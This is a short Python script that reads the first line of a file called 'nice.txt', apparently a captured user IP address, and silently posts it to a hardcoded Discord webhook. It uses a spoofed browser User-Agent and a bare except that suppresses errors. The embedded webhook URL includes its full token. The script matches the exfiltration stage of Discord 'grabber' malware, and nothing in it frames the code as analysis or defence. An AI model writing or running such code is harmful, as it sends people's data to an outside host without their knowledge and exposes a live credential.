import os
import re
import json

from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/794054099044925470/R7JS0pgGDYm3W-uZEmseyTr_CzR9w2HsTsnVpBiffFeNPcNl-YDIm4T8AclhUnub18dZ'





def main():
    

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    File_object = open("nice.txt","r")
    File_object.seek(0)
    userip = File_object.readline(100)


    payload = json.dumps({'content': userip})

    
    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()
